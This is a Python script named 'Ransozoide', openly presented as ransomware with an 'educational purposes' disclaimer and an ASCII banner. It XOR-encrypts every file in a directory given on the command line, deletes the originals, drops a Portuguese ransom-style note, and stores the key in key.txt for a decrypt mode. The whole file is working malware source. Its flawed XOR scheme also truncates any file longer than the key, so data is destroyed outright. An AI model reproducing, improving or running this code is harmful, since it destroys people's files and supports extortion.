
import os
import string
import random
import sys

def str_xor (s1, s2):

	return "".join([chr(ord(c1) ^ ord(c2)) for (c1,c2) in zip(s1,s2)])

def key_generator(length):

	key = (''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!\$%&/()=?{[]}+~#-_.:,;<>|\\') for _ in range(length)))

	with open('key.txt', 'w') as w:
			w.write(key)
			w.close()
	return key

menu = r'''
--------------------------------------------------------------------------------------------------
Special Thanks to: ArielFreud 

[!] Legal Disclaimer: usage of Ransozoide without prior mutual consistency can be considered as an 
	illegal activity. it is the final user's responsibility to obey all applicable local, state and 
	federal laws. author assume no liability and are not responsible for any misuse or damage caused 
	by this program.

	That was developed for educational purposes!

--------------------------------------------------------------------------------------------------
$$$$$$$\   $$$$$$\  $$\   $$\  $$$$$$\   $$$$$$\  $$$$$$$$\  $$$$$$\  $$$$$$\ $$$$$$$\  $$$$$$$$\ 
$$  __$$\ $$  __$$\ $$$\  $$ |$$  __$$\ $$  __$$\ \____$$  |$$  __$$\ \_$$  _|$$  __$$\ $$  _____|
$$ |  $$ |$$ /  $$ |$$$$\ $$ |$$ /  \__|$$ /  $$ |    $$  / $$ /  $$ |  $$ |  $$ |  $$ |$$ |      
$$$$$$$  |$$$$$$$$ |$$ $$\$$ |\$$$$$$\  $$ |  $$ |   $$  /  $$ |  $$ |  $$ |  $$ |  $$ |$$$$$\    
$$  __$$< $$  __$$ |$$ \$$$$ | \____$$\ $$ |  $$ |  $$  /   $$ |  $$ |  $$ |  $$ |  $$ |$$  __|   
$$ |  $$ |$$ |  $$ |$$ |\$$$ |$$\   $$ |$$ |  $$ | $$  /    $$ |  $$ |  $$ |  $$ |  $$ |$$ |      
$$ |  $$ |$$ |  $$ |$$ | \$$ |\$$$$$$  | $$$$$$  |$$$$$$$$\  $$$$$$  |$$$$$$\ $$$$$$$  |$$$$$$$$\ 
\__|  \__|\__|  \__|\__|  \__| \______/  \______/ \________| \______/ \______|\_______/ \________|

CODED BY: Sargastico

MY GIT: https://github.com/Sargastico
--------------------------------------------------------------------------------------------------
'''
print(menu+ '\n')

#diretorio = str.encode('C:\\Users\\ferna\\Desktop\\test\\') 
diretorio = str.encode(sys.argv[3])

if sys.argv[1] == '-e':

	key = key_generator(int(sys.argv[2]))

	arq = open('Leia-me.txt', 'w') 
	arq.write('OOOOPPSSSS! Seus arquivos foram criptografados! =D \n')
	arq.close()

	for files in os.listdir(diretorio):
		os.chdir(diretorio)

		with open(files, 'rb') as r:
			data = r.read()
			r.close()
			enc = str_xor(data, key.strip('\n'))
			new_file = '(encrypted)'+os.path.basename(files)

		with open(new_file, 'wb') as n:
			n.write(enc)
			n.close()
			os.remove(files)
			print(os.path.basename(files)+" <<<<>>>> Criptografado! ")

elif sys.argv[1] == '-d':

	with open('key.txt','r') as r:
		key = r.read()
		r.close()

	for files in os.listdir(diretorio):
		os.chdir(diretorio)

		with open(files, 'rb') as r:
			data = r.read()
			r.close()
			dec = str_xor(data, key.strip('\n'))
			new_file = files.strip('(encrypted)')

		with open(new_file, 'wb') as n:
			n.write(dec)
			n.close()
			os.remove(files)
			print(os.path.basename(new_file)+" <<<<>>>> Descriptografado! ")

else:
 	print("Use valid arguments -e/-d [encrypt/decrypt]")
